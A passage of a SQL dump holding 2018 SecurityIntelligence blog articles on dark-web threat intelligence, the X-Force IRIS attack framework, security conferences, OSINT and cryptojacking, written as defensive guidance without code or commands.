exploits, vulnerabilities and other indicators of compromise, as well as insight into the techniques, tactics and procedures [TTPs] that criminals use for distinct knowledge about the tools and malware threat actors favor.” When this real-time threat data is filtered through sufficient context and separated from false positives, it becomes actionable intelligence. McMillen believes there are several ways organizations can benefit from dark-sourced intelligence. These benefits include understanding emerging threat trends to develop mitigation techniques proactively. Dark-source intelligence could also help with identifying criminal motivations and collusion before attacks. It could even aid in attributing risks and attacks to specific criminal groups. For expert threat researchers like McMillen, patterns of deep web activity can reveal an attack in progress, planned attacks, threat trends or other types of risks. Signs of a threat can emerge quickly, as financially-driven hackers try to turn stolen data into profit within hours or minutes of gaining entry to an organization’s network. The average time it takes to identify a cybersecurity incident discovery is 197 days, according to the 2018   from the Ponemon Institute, sponsored by IBM. Companies who contain a breach within 30 days have an advantage over their less-responsive peers, saving an average of $1 million in containment costs. “Employing dark web monitoring solutions that allow the use of focused filters to identify key phrases, such as your brand and product names, that may contain information that can negatively affect your organization is a good start in your effort to glean useful intelligence from the dark web,” McMillen said. The collected data should then be alerted and routed through a human analysis process to provide actionable insights. Context-rich threat intelligence can reveal many different forms of risk. Among the key risk factors and threats are mentions of an organization’s name in forum posts, paste sites, channels or chatrooms. Contextual analysis can determine whether threat actors are planning an attack or actively possess stolen data. Other high-risk discussions can surround niche industries or verticals, or information on compromising highly-specific technologies employed by an organization.\n When a breach has occurred, the sale of PII, personal health data, financial data or other sensitive information can be indicative of the aftermath of an attack. A single data record can sell for up to $20, according to  . This data is generally stolen en-masse from large organizations — such as credit agencies and banks — so a few thousand credit card numbers can turn a huge profit. Unsurprisingly, 76 percent of breaches are financially motivated, according to the 2018 Data Breach Investigations Report from  . Lost or stolen credentials were the most common threat action employed in 2017, contributing to 22 percent of data breaches, according to the Verizon report. While the presence of usernames and passwords on paste sites or marketplaces can indicate a data breach, contextual analysis is required to determine whether this is a recent compromise or recycled data from a prior incident.\n In May 2018, threat intelligence company   uncovered a massive floating database of identity information, including over 1.4 billion unencrypted credentials.\n “The breach is almost two times larger than the previous largest credential exposure,” Julio Casal, founder of 4iQ, told  .\n Social engineering tactics are employed in 52 percent of attacks, according to a February 2018 report from security company  . Collusion around information recon can surface in both open and closed-forum exchanges between individual threat actors and collectives.\n As   become more sophisticated, deep web threat intelligence can reveal popular TTPs and risks. Coordination around information recon is common. Threat actors can now purchase increasingly complex phishing-as-a-service software kits and if defenders are familiar with them, they can better educate users and put the right controls in place. Although malicious insiders cause fewer breaches than simple human error, the darknet is an established hub for criminal collectives to recruit employees with network credentials for a sophisticated attack.   tracked nearly twice as many references to   on darknet forums in 2016 as in 2015. Trade secrets and competitive intelligence are another lucrative aspect of threat actor commerce that can signal risks to researchers. In one recent incident reported by   in July 2018, a likely Russian cybercriminal sold access to a law firm’s network and sensitive assets for $3,500. Having had that information ahead of time could have saved the victim time, money, and reputational damage. While there is clear strategic and tactical value to darknet threat intelligence, significant challenges can arise on the road to deep web threat hunting and data-mining. For instance, it’s not ideal to equip security operations center (SOC) analysts with a Tor browser. The potential volume of false positives based on the sheer size of the hidden web necessitates a more effective approach. “The dark web is fragmented and multi-layered,” McMillen said. When researchers discover a credible source, it generally requires hours to vet intelligence and perform a complete analysis. Darknet commerce has also grown increasingly mercurial and decentralized as law enforcement tracks criminal TTPs as they emerge. Security leaders who can overcome these barriers have the potential to significantly improve security strategy in response to emerging threat trends and risk factors. The   from the Ponemon Institute, sponsored by IBM Security, discovered that artificial intelligence (AI ) could provide deeper security and increased productivity at lower costs. Sixty-nine percent of respondents stated that the most significant benefit of AI was the ability to increase speed in analyzing threats. As leaders consider how to deepen adoption of dark threat intelligence, it’s valuable to understand that not all intelligence sources can adequately capture the full scope of threat actor exchange on this vast, fast-morphing plane. Relying on stagnant, outdated or fully automated technologies may fail to mitigate important risks. The best mode of protection is one which combines the intelligence of skilled human researchers and AI to turn raw data into   effectively.', '\'Dark Web\', \'Data Mining\', \'Hackers\', \'Hacking\', \'Threat Detection\', \'Threat Intelligence\', \'threat landscape\', \'X-Force\'', 'https://securityintelligence.com/7-ways-to-identify-darknet-cybersecurity-risks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (23, 'How a Cyberattack Framework Can Help Reduce Risk at All Levels, Part 3', 'Alexandrea Berninger', '2018-8-1', 'Any determined attacker has a good chance of being able to infiltrate a network. However, just because an attacker makes it through the front door, that doesn’t mean they will walk away with the organization’s proprietary data. While the first two posts in this series recommended actions to hinder an attacker’s ability to plan and launch an attack, this post will explore how to subvert an attacker already in a network. The IBM X-Force   cyberattack framework helps organizations understand how cyberattackers achieve their objectives and provides a model for identifying actions security practitioners can take to lower the risk of a successful breach. The process for defenders to find and halt the activities of attackers already in the network begins with recognizing and mitigating the initial compromise and then covers opportunities to find and track attackers as they establish a foothold in the network. \n Although the goal may be to stop an attack from occurring, the reality is that perimeter defense — such as firewalls designed to stop malware from entering the network — is not a failproof solution and cannot be relied on as the only defense. Perimeter defense has value as one of several defense layers and can be effective at stopping opportunistic attacks, those where an attacker uses known vulnerabilities, and malware against multiple organizations hoping to breach the least-prepared target. Perimeter defense is less likely to stop a targeted attack where a persistent and adaptive attacker has tailored an attack to circumvent defenses and can adapt their tactics to changes or roadblocks. There are countless opportunities for an attacker to breach a network and there is no single solution that will stop them from compromising the organization’s network if they are motivated to find a way inside. Instead, defenders need to consider how to prioritize controls that can increase the odds of finding and stopping an attacker from achieving their goal. Organizations have a finite amount of resources to devote to security, and using a cyberattack framework to analyze attacker techniques can aid in finding the defensive strategy that will give the most significant return on investment. The IBM X-Force IRIS cyberattack framework initiates after an cyberthreat actor has launched an attack, beginning with a successful initial compromise. The initial compromise occurs when the attacker has gained access to at least one host on the network or has otherwise gained access to the network — perhaps via logging on with stolen or brute-forced credentials.  are the most common threat vector for attackers to gain network access. Therefore, focusing resources to harden this initial attack surface can help reduce the risk of initial compromise. In a phishing or spear phishing attack, a fraudulent email or electronic communication is sent to users within an organization, luring them into revealing network credentials, clicking a link or downloading a legitimate-looking attachment with hidden malware. Depending on the attacker’s techniques and goals, phishing attacks can occur with or without the use of malware. Implementing the following  , educating employees, and revisiting internal security and reporting processes can reduce the risk of a phishing email being successful: Both solution types are valuable defense layers. IDS can be configured to alert on a broader set of signatures, while IPS detection signatures should be based on higher confidence of malicious activity. To enhance protection, make a point of maximizing storage and retention policies for data collected from an IDS or IPS. This data can be valuable forensic evidence for incident response teams looking to analyze, contain and mitigate a breach. In addition to phishing attacks, which target the operating systems employees use (also known as client-side attacks), cyber adversaries can also employ server-side attacks that target servers and can include web compromise or exploit a network vulnerability to infiltrate servers the organization operates. Good network hygiene — such as securing open ports, performing input validation and ensuring effective patch management — is one way to  . In the next phase in the framework, the attacker establishes a foothold by ensuring access and control of at least one host or user account within the organization’s network. An attacker can accomplish this by having gained access to network credentials, installing remote control malware on endpoints or installing a backdoor on the network. Typically, attackers will establish a link to their command and control (C2) infrastructure and use it to control endpoints they have infected remotely. To maintain persistence, an attacker will work to strengthen their foothold in the target environment by securing redundant and overlapping access to the network in case the system is restarted or rebuilt, an access point fails or stolen credentials are reset. Often, actions to maintain persistence occur simultaneously when the attacker establishes a foothold. For example, an attacker may reference the initial backdoor in a Windows Registry location that could ensure it will run each time the host is restarted. Moreover, actions to maintain persistence can continue to occur throughout the remainder of the attack as the attacker moves deeper into the organization’s networks. Actions taken by attackers, both for establishing a foothold and for maintaining persistence, can be visible and mitigated. In some cases, malicious activities can be flagged by an IDS/IPS platform or an EPP/EDR platform, which can be configured to search for known threats. While detecting known threats is part of protecting against attacks, when it comes to threats and attacker methodologies that are not yet known, a well-established and effective threat-hunting program can aid in threat identification and mitigation. A new or existing threat-hunting program can be scoped and augmented to help reduce the operational burden on security teams — all while adding value to the overall ability of the organization to find intruders before they can do any harm. Building a threat profile, as described in the   of this blog series, can aid in prioritizing threat-hunting requirements around an organization’s most valuable assets and the likely threats most relevant to those assets. To scope a threat-hunting program, it can be helpful to start with a “crawl, walk, run” approach. A narrow focus can begin by examining networks for signs of specific activities of an attacker — for example, establishing a foothold and maintaining persistence — particularly if those actions are against the highest priority assets. As a threat-hunting team succeeds in these aspects, the scope can be expanded to include more types of activities attackers are likely to take and to search across additional environments and assets. Once an unknown threat is discovered through threat hunting, the associated indicators of the threat can be migrated as signatures into the detection and protection platforms, and any other instances will be identified automatically. Additionally, investment in a centralized   can automatically prioritize data, setting it into tiers ranging from benign activities to those likely indicating maliciousness. Understanding and labeling telemetry data that is likely due to normal business operations as benign can be just as important at identifying suspicious activity. Whitelisting and creating a baseline for normal activity, as well as performing frequency analysis, can aid in detecting anomalies. Performing this analysis, however, is difficult without some type of centralized logging and analysis platform. Examining the   and the steps attackers take to initially compromise, establish a foothold and maintain persistence can help in identifying prioritized avenues to increase security. The final post in this blog series will examine defensive actions that can help identify attackers as they move through an organization’s network, escalate their access and exfiltrate proprietary data.', '\'Cyberattacks\', \'Cybercriminals\', \'IBM Security\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Management\', \'Incident Response (IR)\', \'Phishing\', \'Security Framework\', \'Social Engineering\', \'Threat Intelligence\', \'Threat Management\', \'Threat Monitoring\', \'Threat Protection\', \'X-Force\'', 'https://securityintelligence.com/how-a-cyberattack-framework-can-help-reduce-risk-at-all-levels-part-3/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (24, 'How to Get the Most Out of DEF CON and Black Hat 2018', 'Anshul Garg', '2018-7-30', 'From its inception in 1997, Black Hat has grown from a small technology-focused conference into a major information security event — offering briefings, education and training for security and risk practitioners. It’s renowned for shedding light on vulnerabilities found in everything from consumer devices to critical infrastructure. , global hardware security and capability development lead at IBM X-Force Red, said it best: “Black Hat is all about security professionals sharing knowledge, working together and seeing some of the awesome stuff going on in the industry, all while at the same time having fun and making new friends.” Immediately following   — which will take place in Las Vegas, Nevada, from Aug. 4–9 — is the somewhat less formal DEF CON. DEF CON is one of the world’s largest hacker conventions and is happening in Las Vegas from Aug. 9–12. David Bryan, global leader of technology at  , is most excited about this event: “DEF CON is a time when newbies, seasoned hackers and professionals come together to share knowledge and level the playing field. It’s also a great time for folks to brush up on their skills and share knowledge in the community.” \n Many valuable talks, meetings, demos and games will take place at both   and   — and it can be hard for first-time attendees and veterans alike to decide how to spend their time. Below are some interesting sessions I know I don’t want to miss. In this  , which will take place on August 9 at 12:10 p.m., Daniel Crowley and Mauro Paredes from IBM X-Force Red and Jennifer Savage from Threatcare will discuss the  , vulnerabilities they have identified in commonly used devices and how to strengthen smart city security. Attend this talk to learn more about what technology is in our cities today, what’s in store for the future, and how to discover and attack the technology that runs modern cities. (I’m personally looking forward to finding out what vulnerabilities, if any, the team discovered in my home city!) One of the challenges red-team operators face when emulating an adversary is unrestricted or unsupervised communication across defensive technology deployed by the enterprise. Meet Foxtrot C2, IBM X-Force Red’s concept tool designed to help penetration testers overcome enterprise network inspection mechanisms, successfully deliver malicious payloads and establish a long-running operation while consistently bypassing behavioral traffic correlation mechanisms deployed on the company network. Join the talk on August 9 at 2:30 p.m. to hear IBM X-Force Red’s Dimitry Snezhkov  . Identifying security vulnerabilities has become a business-as-usual activity for many companies — now the real challenge is to fix them. Given the sheer volume of vulnerabilities coupled with the lack of vulnerability management resources, prioritizing and remediating the most critical flaws is an overwhelming project. Many rely on Common Vulnerability Scoring System (CVSS) scores. However, these alone are not enough because they do not take into account whether a vulnerability is actively being weaponized in the wild. Join IBM X-Force Red’s Charles Henderson and Steve Ocepek at 11 a.m. on August 9 to learn more about  . At 5 p.m. on August 10, IBM X-Force Red’s Space Rogue will participate in a   at DEF CON with members of the hacking collective L0pht Heavy Industries. The panel will look back on 20 years of cybersecurity and discuss the group’s   to warn Congress of glaring vulnerabilities in government systems. A departure from ordinary competitive hacking games, the   is very likely the first ever   to include the actual physical destruction of players’ machines. It will almost certainly also be the first CTF where those machines are destroyed by a person in a hot dog costume. Featuring creative and hilarious destruction methods, a Hot Dog Beauty Pageant and plenty of other shenanigans, the d20 CTF will no doubt delight and entertain attendees. Are you planning your next career move? Are you looking to network with the best in the industry? Visit IBM at booth No. 2104 at Black Hat to discuss potential opportunities. You can also experience the disruption bar, get your password ‘cracked’ by the tool, look inside an automated teller machine (ATM) and chat with IBM X-Force Red’s team of veteran hackers. And since IBM X-Force Red is celebrating its second birthday, there will be gifts for all who visit. To learn more about the team’s latest discoveries, follow the   podcast series. Whether it’s cars, planes, toilets (yes, seriously!), ATMs or satellites, you never know what this hacking team will break into next — and you won’t want to miss a single episode.', '\'Black Hat\', \'Black Hat USA\', \'DEF CON\', \'IBM Security\', \'Security Conferences\', \'Vulnerabilities\', \'Vulnerability Management\', \'X-Force\'', 'https://securityintelligence.com/how-to-get-the-most-out-of-def-con-and-black-hat-2018/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (25, 'How a Cyberattack Framework Can Help Reduce Risk at All Levels, Part 2', 'Alexandrea Berninger', '2018-7-25', 'Attackers are continually researching companies that are vulnerable to attack and refining their attack plan. However, there are opportunities to undermine a threat actor’s attack preparation and ability to compromise your organization successfully.  developed a cyberattack framework to better understand, track and defend against patterns of malicious behavior used by various adversarial actors. The IBM X-Force IRIS cyberattack preparation framework focuses on implementing security procedures applicable to an organization’s internet-facing environment. Increasing network infrastructure security to guard against the attacker’s external reconnaissance and launch attack phases can help reduce the risk of a successful system compromise. During the external reconnaissance phase of the framework, the attacker will research the target organization and look for  , such as unsecured vulnerabilities, unpatched applications and open ports. Attackers may search forums for usernames and passwords that could give them remote access to the organization’s internal network. They may also reach out to employees to try to convince them to provide their network access credentials or other information the attacker could use. Finally, attackers seek opportunities to access organizations indirectly. For example, attackers may compromise companies that have third-party access to an organization’s network. This type of attack is known as a supply chain attack. Several   involved an attacker exploiting an entry point through a third party with weaker security controls than the target company. \n On the defender’s side, there are opportunities to increase visibility on the organization’s internet-facing networks to help analysts find the anomalous or malicious activity that may indicate that an attacker is conducting external reconnaissance. The key to risk reduction during the attacker’s external reconnaissance is understanding the organization’s networks and hardening the attack surface. First, security teams should examine the organization’s online exposure and opportunities customers have to interact with it via the internet — since a malicious actor can misuse these. Defenders can gain visibility into an attacker’s actions during the external reconnaissance phase by closely monitoring for unusual browsing of the organization’s external-facing websites. Additionally, an organization can hunt for signs that   are posted on darknet forums. Monitoring for unusual activity on public domains can include: Although monitoring for unusual browsing may not provide conclusive evidence of a pending attack, it’s part of the overall risk picture and can provide an avenue for further research and monitoring. Attackers may search for vulnerable access points into a network using a port scanner or an exploit kit. For defenders, the best practice is to follow the principle of least privilege, meaning that a user or system should only receive the access privileges that correspond with their role. Although cyberdefense strategies most commonly reference this concept when establishing user access controls, it also applies to systems, applications and processes.   can reduce the attack surface and make it more difficult for the attacker to enter and move around the network. First, security teams should map the organization’s network and identify ports that are accessible from the internet. These open ports act as doors to confidential data on the network and threat actors can exploit ports left unlocked to gain unauthorized entry. Mapping the network properly (and periodically) can help identify risky ports to close or monitor. When applying the concept of least privilege to servers, only allow each server to perform the roles for which it’s authorized. Ideally, for example, a domain controller should only allow traffic and protocols required for domain administration and should not directly access the internet. By contrast, a web server should only interact with the internet in the specific way that was intended by the business and network administrators. In reality, when servers are set up with default settings, more ports are open than are required for that server’s vocation, which can result in unmonitored security gaps. Once the attacker has completed the phases of the IBM X-Force IRIS cyberattack preparation framework, he or she may choose to launch an attack against the target. However, if an attacker failed to complete some of the prepare attack phases, he or she may choose to postpone an attack until more information is garnered or move on to another, more vulnerable target. Therefore, one of the defender’s goals is to harden the attack surface and deter most attackers from viewing the organization as an easy target. An attacker could use stolen credentials with remote access to directly infiltrate a network, or the attacker could also choose to exploit a server. Attacks to infiltrate an internal server can take many shapes and can be as diverse as domain name system (DNS) poisoning or the use of a self-propagating worm delivered from an external network. Efficient and timely patch management can help reduce the risk of a successful compromise. Although patching is a basic security practice, an alarming number of companies have suffered breaches due to unpatched vulnerabilities. According to a   study of 3,000 companies, 48 percent of respondents admitted they had suffered a data breach within the past two years — and of those respondents, 57 percent of the breaches were due to an unpatched vulnerability. A   by software company Symantec found that over 75 percent of legitimate websites have unpatched vulnerabilities. Despite this, many organizations struggle to build an efficient recurring process due to operational complexities, outdated systems and business priorities. One reason systems may go unpatched is a concern — whether perceived or legitimate — that it may result in performance tradeoffs or disruption to operations during patch testing and implementation. To make the right decisions for the business, security teams need to be aware of business trade-offs and weigh them against the risks of continuing to operate with an unpatched system. One way to encourage   is to include security and patch management performance metrics as part of the system administration processes for service, application and system owners. This strategy will incentivize operations teams to include patch management in their operations — whereas most teams are only incentivized to ensure that there is no disruption to operations. Also, developing clear procedures to test patch implementation can help to assuage concerns that the patch will break critical business processes. Creating and using a virtual environment is one option to test patches before deploying them in the live environment. Alternatively, segmenting the network and patching in batches can limit the potential negative consequences. The second reason that patch management often fails is that it’s a manual process where teams have difficulty prioritizing and implementing the most important patches. Ensuring that IT teams have an up-to-date inventory of every asset and automated checks for patches can help identify when and what needs to be patched. Also, building a centralized platform that automates certain processes will create a more organized and efficient patch-management program that can result in fewer security vulnerabilities. Although there is no way to guarantee that an organization’s network will not be compromised, implementing cost-effective security recommendations can help minimize the attack surface and reduce the risk of an attack occurring. The next installments in this series will analyze the X-Force cyberattack execution framework, which models the activities an attacker takes after compromising the network. We will provide recommendations to help defenders increase their visibility of attackers lurking in their networks and best practices to decrease the likelihood of attackers being able to accomplish their mission. You can also learn more by reading the   or listening to the recent SecurityIntelligence podcast episode, “ .”', '\'Cyberattacks\', \'Cybercriminals\', \'IBM Security\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Management\', \'Incident Response (IR)\', \'Security Framework\', \'Threat Intelligence\', \'Threat Management\', \'Threat Monitoring\', \'Threat Protection\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/how-a-cyberattack-framework-can-help-reduce-risk-at-all-levels-part-2/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (26, 'How Open Source Intelligence Could Save Your Network', 'Marcelo Ribeiro', '2018-7-24', 'Imagine you’re an analyst working in a security operations center (SOC). An endpoint glows red on your dashboard, indicating that it’s trying to communicate with an unknown IP address. You check its running processes and see a binary that you don’t recognize, but the user may have installed it. It could be nothing, but you’re not sure. You’ve only been in the job for six months, but on a Sunday afternoon, you’re the most senior person in the room. Your boss is at a wedding and told you not to disturb him unless there is an extreme emergency. What should you do? If this scenario sounds familiar, it’s time to consider investing in  . OSINT is a component of any good   operation. It’s essentially a collection of indicators that point to heightened risk and provide information about a particular threat. This data is key to helping security leaders recognize danger and make informed decisions about their next steps. OSINT can come from many sources in the public domain, which is why experts refer to it as open source. Just as we think about computing technology stacks, we can think of threat intelligence as a knowledge stack. At the bottom are the low-level atomic indicators. These are discrete data points, such as IP and domain addresses, user agent strings and email addresses that might show up in system logs. These indicators complement computed data in the form of malware hashes. A file’s hash can be a smoking gun for a forensics team if it matches hash data gathered from attacks against other organizations. Security professionals can find each of these data types in the public domain — if they know where to look. Moving further up the stack, we can connect these indicators with behavioral ones. Attackers often have a playbook of go-to procedures they favor when compromising a target. By understanding these tactics and knowing what type of behavior to look for, security teams can more easily distinguish an ongoing attack from an innocuous series of unrelated network events. Analysts can move into the realm of threat intelligence by combining this information, watching it play out over several attacks and adding data from other sources, such as news articles and reports. This strategy is a rarefied world where analysts collate   to find out more about threat actors. In many cases, you can find detailed intelligence in published security reports from vendors and consulting firms. Effective analysis of all this OSINT produces clearer insights into attackers’ techniques and the tools they commonly use to achieve their goals. It can also point to their intent: Some attackers may simply be out to steal personal data for sale on the black market, for example, while others may aim to lurk on networks and sabotage company processes. Good open-source intelligence comes from various sources. Magazine and online articles from trusted outlets are good places to start, as are videos from respected security conferences. Other sources include specialist cybersecurity mailing lists, such as the SANS Institute’s   list (although some of these can be difficult to access). Many vertical sectors also have information sharing and analysis centers (ISACs), which are excellent sources of information, as are sector-independent fora like Facebook’s   and AlienVault’s  . The   also provides an extensive threat database that is searchable by a range of parameters, including application name, IP and URL. Other sites dedicated to compiling information about indicators from the atomic to the behavioral include: How might this information be useful in practice? Imagine a harried SOC analyst staring at a strange IP address and uncertain what to do about it. He or she could use OSINT resources like these to research the IP address and file binary, as well as registration entries and any other appropriate data points. The analysts will then be able to make an informed decision about how to triage the event, whether that means dismissing it if it doesn’t crop up in OSINT records or escalating it if the address matches a known bad actor. If the file hash correlates to malware, the analyst can quickly learn what the malware does and what   to look for. If the analyst has to call his or her boss, after all, he or she will be able to explain the problem thoroughly and recommend actions to take. These countermeasures could include restricting or forwarding traffic from a specific IP block, disrupting it using application sandboxing or actively degrading it by redirecting an IP address to a honeypot, for example. The analyst’s specific actions would depend on what he or she knows about the attackers. Sometimes, OSINT can help you to spot things that may not show up on your dashboard at all. Today’s attackers are sophisticated enough to avoid leaving obvious signs. Instead, they live off the land, exploiting existing legitimate tools to achieve their goals. A   may use PowerShell to download a script from a command-and-control (C&C) server and move laterally through the network, contacting other machines, pilfering information from each one that it finds and circumventing your application whitelist protection in the process. Your network monitoring software might pick up the encrypted traffic stream, but what does it mean? If you’re aware of this attack technique thanks to your public domain reading, you may be able to notice it and understand it better. In cybersecurity, knowledge is power, which is why it’s essential to use OSINT to its full advantage. You can be sure that intruders are already doing that — probing everything from your networks to your personnel structure to  . They’re using OSINT to gain every advantage they can, and they only have to be successful once (whereas you face the daunting task of being successful every time). With OSINT tools and insights at your disposal, you can stay one step ahead of these attackers and keep your networks safe from evolving threats.', '\'Incident Response (IR)\', \'Open Source\', \'Security Intelligence\', \'Security Operations Center (SOC)\', \'Threat Intelligence\', \'Threat Sharing\'', 'https://securityintelligence.com/how-open-source-intelligence-could-save-your-network/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (27, 'How the IBM X-Force IRIS Cyberattack Framework Helps Security Teams Reduce Risk at All Levels, Part 1', 'Alexandrea Berninger', '2018-7-18', 'Security teams may need guidance to better understand, track and defend against patterns of malicious behavior, which will help them contend with today’s evolving — and increasingly sophisticated — threat landscape. This is why   developed a cyberattack framework to help organizations predict the steps an adversary might take to infiltrate corporate networks. The   are designed to help security analysts understand malicious actors’ objectives, track threat data and communicate security intelligence more clearly. Defenders can further dissect the threat model to preemptively build defenses and tracking capabilities to help identify and protect against attacks before they occur. While many of the phases described in the preparation framework may be undetectable to target organizations and defenders, the early stages of a cyberattack offer opportunities to increase visibility into attackers’ targeting and planning operations. Often, these measures can be undertaken relatively cheaply and with little to no reduction in operations. Two of the key phases to focus defenses against in the IRIS attack preparation framework are points in time when an “attacker determines objective” and when attackers “prepare attack infrastructure.” \n \n In the first phase of the framework, the attacker determines the target and defines initial mission objectives. On the defenders’ side, analysts can take steps to safeguard the assets attackers are likely to target, such as determining what and where their most valuable data is and whether threat actors have been or may currently be interested in the organization and its assets, intellectual property, customers or proprietary data. Security teams should also integrate threat intelligence into the organization’s cybersecurity program. By building a threat profile of adversarial actors who are likely to target the company, security teams can focus on the most relevant adversarial cyber actors instead of applying generic coverage to the entire pool of active cyber threat groups. This strategy is also in line with best practices suggested by the National Institute of Standards and Technology (NIST)’s  . Threat profiles help provide the contextual background for these malicious actors, such as their capabilities and tactics, which defenders can use to prioritize cyber events and defense. To establish a threat profile, security analysts must answer the following questions: Have threat actors breached the network in the past? If not, are there any indications that they may be interested in your company? For example, has senior management received any  ? These clues can provide valuable insight into the type of actors that may be targeting the organization. Unusual network traffic on the company’s internet-facing ports is another clue. For example, large amounts of traffic originating from countries that your company doesn’t operate in could indicate potentially malicious activity. By understanding past attacks against companies in the same industry, security teams can assess the likely types of threat actors could target the organization and profile familiar capabilities and modus operandi. For example, do these threat groups have the means and technical knowledge to perform an advanced intrusion? Do they typically compromise networks by exploiting  ? Anticipating the adversary’s likely entry path can help prioritize the most impactful areas for security investments. Security teams can gain insight into threat actors’ motives, mission and tactics by understanding contextual information about potential threat actors, such as where they are located. This data can help analysts determine the vectors where increasing vigilance and security could better protect against an attack. Understanding what threat groups are after can help organizations  . Attackers target a variety of data — from financial information, which can be sold on the darknet, to intellectual property, which can be sold for profit or used in corporate espionage. Some threat actors may seek to destroy data or harm critical infrastructure. Understanding the organization’s key assets and predicting which ones are most appealing to threat actors can help security teams determine governance, controls and best practices to help protect and secure their digital environments. During the preparation of the attack infrastructure phase, threat actors may establish command-and-control (C&C) servers and build infrastructure that can be used to craft web pages, emails and domains that look legitimate to unsuspecting targets. Although threat actors typically operate in a stealthy manner, security teams can take steps to uncover and mitigate their actions. Attackers often buy, register or gain illegal ownership of domains, servers, secure sockets layer (SSL) certificates, web service accounts and other network resources to orchestrate their campaigns. They then use their C&C network of servers and web resources to drop, execute, access and control the malware with which they infect their hosts. During the setup process, attackers who mount malicious domains for their infrastructure’s communication schemes may use legitimate or typo-changed domains to fool target users into interacting with their sites or emails. Such email spoofing is often very subtle and can trick even the most observant users into clicking malicious links. To mitigate this threat — and make it harder for attackers to typosquat domains — defenders can purchase all the likely typo-changed domains associated with their company name or monitor for suspicious domain registrations that resemble official domains. Nevertheless, attackers do devise other traps. Depending on the target, attackers may use   to make it seem like their activity is legitimate. For example, fraudsters can create more believable, personalized phishing messages by befriending targets online via fake online profiles. To prevent these types of communications from succeeding, defenders should educate employees about the current trends in spam and spear phishing and describe the dangers of interacting with fraudulent online personas. Security teams should also establish proper governance to help employees respond and react appropriately when they fall victim to social-engineering schemes. It’s also imperative to ensure that employees have positive experiences when reporting potential security incidents — and that security leaders   for falling victim to phishing or social-engineering schemes. To learn more, stay tuned for the next article in this series, which will examine the external reconnaissance and launch attack phases of the framework. The final two posts in this series will model the activities an attacker takes after compromising the network and while attempting to accomplish their mission objectives. That part of the attack is further explained in the X-Force IRIS Cyberattack Execution Framework. You can also download the   and listen to the   for more insights.', '\'Cyberattacks\', \'Cybercriminals\', \'IBM Security\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Management\', \'Incident Response (IR)\', \'Phishing\', \'Security Framework\', \'Social Engineering\', \'Threat Intelligence\', \'Threat Management\', \'Threat Monitoring\', \'Threat Protection\', \'X-Force\'', 'https://securityintelligence.com/how-the-ibm-x-force-iris-cyberattack-framework-helps-security-teams-reduce-risk-at-all-levels/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (28, 'Move Over, Ransomware: Why Cybercriminals Are Shifting Their Focus to Cryptojacking', 'Andrew Chang Gu', '2018-7-17', 'According to the  , the frequency and sophistication of malicious cryptocurrency mining, also called “cryptojacking,” has increased drastically in the past year. This mining is changing malicious actors’ priorities: While they had previously targeted companies’ data and financial assets, they are now seeking to extract value from organizations’ computing resources. As a result, industries with powerful computers and relatively weak defenses — such as scientific research institutions and media companies — are suddenly caught in the crosshairs.  emerged when bitcoin, the first decentralized cryptocurrency, hit the scene in 2009. The process of mining cryptocurrency requires computationally intensive calculations to verify transactions, and miners are rewarded with cryptocurrency for this labor-intensive work. Since mining is a competitive process, it requires extensive computing power. When bitcoin was first introduced, general-purpose central processing units (CPUs) could be used to mine it. But with each coin mined, the calculations required to mine the next coin become more complicated — demanding more computing power and more time to solve. The mining applications that followed were developed to harness the power of graphics processing units (GPUs) to work more efficiently than mining with CPUs. GPUs are commonly used in enterprise settings, but they are also used for PC gaming, rendering graphics, scientific modeling and a variety of other complex tasks. Today, bitcoin is mined with specialized application-specific integrated circuits (ASICs), which are optimized for the bitcoin algorithm, making general-purpose GPUs much less desirable for this purpose. However, bitcoin is no longer the only valuable cryptocurrency being mined. New cryptocurrencies, such as Ethereum and Monero, are ASIC-resistant and better suited for mining by general-purpose computers. The creators of these cryptocurrencies worried about the centralization of bitcoin mining because of ASICs. Therefore, they created mining algorithms that harness memory capacity and speed. As a result, these new coins can be mined with general-purpose computers — triggering the   across the globe. Current mining malware can be divided into two major groups: web- and host-based malware. Web-based mining malware is hosted on a website and activates when a user browses on an infected page. It is often written in JavaScript and executes as a web application on the local machine. This type of malware typically mines currencies like Monero, which is well-suited for mining via CPUs. Web-based miners are difficult to detect or stop because — while they don’t install themselves on local machines — they exploit local machines for their own purposes, unbeknownst to the users. Potential consequences of this type of attack include significant performance degradation, crashes and even overheating for mobile devices, according to  . Host-based mining malware is a malicious application installed natively on the system, typically by a dropper-type Trojan. Often, the malware is just standard mining software running in a windowless mode in the background. Other times, however, it’s more sophisticated. For example, the malware may use   to execute itself and then disguise the mining application’s process inside a legitimate system process — making it harder for users and antivirus solutions to identify and remove it. Host-based malware has better access to system resources, including the computer’s GPU, making it potentially much more lucrative for cybercriminals. Additionally, the miner can schedule its activity for ideal times — so the user does not feel any performance impact — giving the cryptojacking better longevity on infected machines. One example of host-based cryptojacking was reported in February 2017 when malicious actors breached a popular software download site to infect Apple product updates with mining malware, according to  . Apple OSX computers are known for their high-end hardware, making them appealing targets for mining malware. Mining malware represents a relatively new threat to businesses. Unlike ransomware, it exploits hardware resources rather than the value of data. Businesses typically have large internal networks, which translates to heavy processing power. As more companies move to cloud-based storage solutions,   at generating profit for criminals. Business owners with cloud storage can simply wipe their systems and restore their files from those backups. Attackers slinging mining malware aren’t interested in collecting ransom payments. As soon as a miner starts working, its operator can start raking in profits in the form of cryptocurrency. Also, mining malware is much stealthier than ransomware because it doesn’t need to alert the user in any way. While ransomware notifies the user of its presence as a way to elicit payment, mining malware can run in the background for months — or even years — before discovery, especially if security professionals aren’t actively looking for it. Since mining performance is determined by hardware performance, infecting high-end workstations and desktops is a priority for threat actors. This tactic is bad news for creative and scientific industries that use powerful computers to develop films, animations and games or conduct complex research. These types of organizations are also less likely to have invested in security and more likely to have awareness gaps. Mining malware poses a serious threat 